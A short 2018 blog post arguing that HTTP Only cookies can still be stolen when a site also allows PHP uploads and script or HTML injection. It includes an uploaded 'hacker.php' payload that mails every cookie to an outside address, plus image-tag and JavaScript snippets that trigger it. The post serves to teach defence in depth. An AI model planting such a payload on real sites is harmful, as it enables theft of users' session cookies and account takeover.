---
title: HTTP Only Cookies Aren't Perfectly Secure
date: 2018-12-10
tag:
- php
- javascript
- security
---
When you're creating cookies on your server side application, it's good security practice to flag the cookie as HTTP Only.  This way, it instructs the browser that it should sandbox this cookie from the client side scripts.  It still will send it between client and server on each subsequent request, but javascript can't access it directly.

<!--more-->

With most things, one single mechanism isn't the only way to secure your website.  Security is multi layer in depth strategies.  That's important to understand when you are using HTTP Only cookies.

**Before you continue: please understand that this is a very contrived example. It's meant to demonstrate the possibility. It's not likely, but it's possible.**

It's still possible to steal HTTP Only cookies from your website. It's just not that easy and requires multiple vulnerabilities in your code - not just client side script injection.

## How to Steal HTTP Only Cookie

Let's look at our code that sets our cookie in our PHP server / backend application.

{{< filename-header "index.php" >}}
```php
<?php
setcookie('my-cookie', 'the value', 0, "", "", false, true);

// more code here
```

The last `true` indicates that we want to have this cookie as HTTP Only.  To verify this, I can open up my dev tools and type `window.cookie` which will return `undefined` in this example.

Next, we need to have a vulnerability that allows users to upload PHP scripts.  You might say "well if they can access PHP, they can already do a bunch of other things anyway!"  That's not true. You might have your user uploads properly secluded from the rest of your application.  Let's create a PHP file that we trick into the user uploads to run as an application.  (For this contrived example, it'll be a plain PHP file. It's possible with other vulnerabilities and misconfigurations to get image files to run as PHP, etc.)

{{< filename-header "/uploads/uuid-here/hacker.php" >}}
```php
<?php
mail('hacker@gmail.com', 'An HTTP only cookie', var_export($_COOKIE, true));
```

Since this is on the same server, it will be served with the HTTP only cookie by the browser.

The last step is to inject a request to this application the same way you'd do some client side script injection.

If you can inject HTML, you might try this:

```html
<img src="/uploads/uuid-here/hacker.php">
```

If you are unable to do that, you can still use Javascript with `fetch()` or, if you're a fan of the image, you can do this:

```javascript
var i = new Image();
i.src="/uploads/uuid-here/hacker.php";
```

## End Notes

Again, like I said, it's not easy. It would require two vulnerabilities or misconfigurations. However, it _is_ possible to steal an HTTP Only cookie.